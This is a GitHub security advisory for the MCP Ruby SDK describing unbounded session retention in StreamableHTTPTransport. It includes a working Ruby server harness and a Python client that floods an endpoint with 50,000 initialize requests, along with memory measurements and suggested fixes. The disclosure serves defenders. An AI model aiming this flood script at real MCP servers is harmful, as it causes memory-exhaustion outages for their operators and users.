# [M] MCP Ruby SDK: Unbounded session retention in StreamableHTTPTransport allows memory exhaustion via initialize flood

## Summary
Severity: Medium
Advisory: GHSA-52jp-gj8w-j6xh
CVE: CVE-2026-67430
CWE: CWE-401, CWE-770
Ecosystem: RubyGems
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L (CVSS_V3)
Published: 2026-07-30
Source: https://github.com/advisories/GHSA-52jp-gj8w-j6xh
Type: github-advisory

## Affected
- RubyGems: `mcp` — affected >=0 <0.23.0

## Details
## Summary

In its default configuration, `MCP::Server::Transports::StreamableHTTPTransport` never expires sessions. Every successful `initialize` request stores a new `ServerSession` and a session record under a fresh UUID, and the only path that removes them is an explicit client-issued HTTP `DELETE`. An unauthenticated attacker can repeatedly initialize new sessions and immediately disconnect, forcing the server to retain an unbounded number of `ServerSession` objects until memory is exhausted.

## Affected component

`lib/mcp/server/transports/streamable_http_transport.rb`:

- Line 27, constructor: `def initialize(server, stateless: false, enable_json_response: false, session_idle_timeout: nil)` — the default for `session_idle_timeout` is `nil`.
- Line 46: `start_reaper_thread if @session_idle_timeout` — when the timeout is `nil`, the reaper that prunes idle sessions is never started.
- Lines 604–643 (`handle_initialization`): every successful `initialize` inserts a new session record; the only removal sites are `handle_delete` (client-controlled) and stream-error paths.

The project README acknowledges the insecure default (line 1605):

> By default, sessions do not expire. To mitigate session hijacking risks, you can set a `session_idle_timeout` (in seconds).

Per-session memory cost is non-trivial: each entry contains a `ServerSession` instance (with its own `Mutex`, `@in_flight` hash, capabilities hash, and server reference), a top-level hash entry under the session UUID, and per-pending-request `Queue` allocations.

## Proof of concept

### Server (`session_poc_server.rb`)

Starts the transport in its default configuration (no `session_idle_timeout`) and reports the in-memory session count plus process RSS every two seconds.

```ruby
require "bundler/setup"
require "mcp"
require "mcp/server/transports/streamable_http_transport"
require "rackup"
require "webrick"
require "rackup/handler/webrick"

server = MCP::Server.new(name: "session-poc-target", tools: [])
transport = MCP::Server::Transports::StreamableHTTPTransport.new(server)

Thread.new do
  loop do
    sessions = transport.instance_variable_get(:@sessions)
    count = sessions ? sessions.size : 0
    rss_mb = `ps -o rss= -p #{Process.pid}`.to_i / 1024
    STDERR.puts("[mem] sessions=#{count}  RSS=#{rss_mb} MB")
    sleep 2
  end
end

STDERR.puts("[poc] listening on http://127.0.0.1:9295/")
Rackup::Handler::WEBrick.run(
  transport,
  Host: "127.0.0.1", Port: 9295,
  AccessLog: [], Logger: WEBrick::Log.new(File::NULL),
)
```

### Client (`session_poc_client.py`)

```python
import concurrent.futures, json, socket, time

HOST, PORT = "127.0.0.1", 9295
TOTAL, WORKERS = 50_000, 32

INIT = json.dumps({
    "jsonrpc": "2.0", "id": 1, "method": "initialize",
    "params": {"protocolVersion": "2025-11-25", "capabilities": {},
               "clientInfo": {"name": "flooder", "version": "1.0"}}
}).encode()

REQ = (
    f"POST / HTTP/1.1\r\nHost: {HOST}:{PORT}\r\n"
    f"Content-Type: application/json\r\n"
    f"Accept: application/json, text/event-stream\r\n"
    f"Content-Length: {len(INIT)}\r\nConnection: close\r\n\r\n"
).encode() + INIT

def one():
    try:
        s = socket.create_connection((HOST, PORT), timeout=5)
        s.sendall(REQ)
        data = b""
        while True:
            c = s.recv(8192)
            if not c: break
            data += c
        s.close()
        return b"mcp-session-id" in data.lower()
    except OSError:
        return False

start = time.time()
created = 0
with concurrent.futures.ThreadPoolExecutor(max_workers=WORKERS) as ex:
    futs = [ex.submit(one) for _ in range(TOTAL)]
    for i, f in enumerate(concurrent.futures.as_completed(futs), 1):
        if f.result():
            created += 1
        if i % 1000 == 0:
            print(f"[poc] dispatched {i} reqs, {created} sessions confirmed, "
                  f"elapsed {time.time() - start:.1f}s")

print(f"[poc] done. {created}/{TOTAL} sessions confirmed in "
      f"{time.time() - start:.1f}s")
```

### Reproduction commands

```sh
bundle install
ruby session_poc_server.rb          # terminal A
python3 session_poc_client.py       # terminal B
```

### Observed result

Tested on macOS, Ruby 3.2.4, against the SDK's `main` branch.

Server terminal:

```
[mem] sessions=0      RSS=45  MB
[mem] sessions=2605   RSS=56  MB
[mem] sessions=11587  RSS=72  MB
[mem] sessions=23119  RSS=85  MB
[mem] sessions=34391  RSS=119 MB
[mem] sessions=45325  RSS=128 MB
[mem] sessions=50000  RSS=154 MB
[mem] sessions=50000  RSS=152 MB
[mem] sessions=50000  RSS=152 MB
[mem] sessions=50000  RSS=152 MB     # plateau persists indefinitely
```

Client terminal:

```
[poc] dispatched 50000 reqs, 50000 sessions confirmed, elapsed 26.6s
[poc] done. 50000/50000 sessions confirmed in 26.6s
```

50,000 unique sessions are created and retained in 26.6 seconds from a single client. The session count remains pinned at 50,000 indefinitely, confirming that no reaper exists to free the records. Scaling the attack linearly (multiple clients, larger client-capability payloads, longer runtime) drives RSS until the worker is OOM-killed.

<img width="3544" height="1674" alt="image" src="https://github.com/user-attachments/assets/89ac35ab-5629-4b48-83f8-e26a92b3e45c" />

## Impact

- **Attacker requirements:** unauthenticated TCP reach of the MCP endpoint. No session, no credentials.
- **Effect:** memory-exhaustion denial of service. A sustained or distributed attacker can OOM the worker; on services that recycle workers, the attacker simply repeats. On multi-tenant gateways, one tenant can starve all others.
- **Affected deployments:** every deployment that does not opt into `session_idle_timeout`. Because the README presents this as an opt-in mitigation rather than a default, real-world deployments are likely to ship vulnerable.

## Suggested mitigation

1. Change the default of `session_idle_timeout` to a finite value (e.g. 30 minutes) and document the change as a security default.
2. Add a `max_sessions:` constructor option; reject `initialize` with HTTP 503 once the cap is reached.
3. Track the time of the `initialize` POST separately from later request activity, and evict sessions whose GET SSE stream is never attached within N seconds.

## References
- https://github.com/modelcontextprotocol/ruby-sdk/security/advisories/GHSA-52jp-gj8w-j6xh
- https://nvd.nist.gov/vuln/detail/CVE-2026-67430
- https://github.com/modelcontextprotocol/ruby-sdk/commit/afb968c468c178c4d3294b423fcce250621692f4
- https://github.com/modelcontextprotocol/ruby-sdk
- https://github.com/modelcontextprotocol/ruby-sdk/releases/tag/v0.23.0
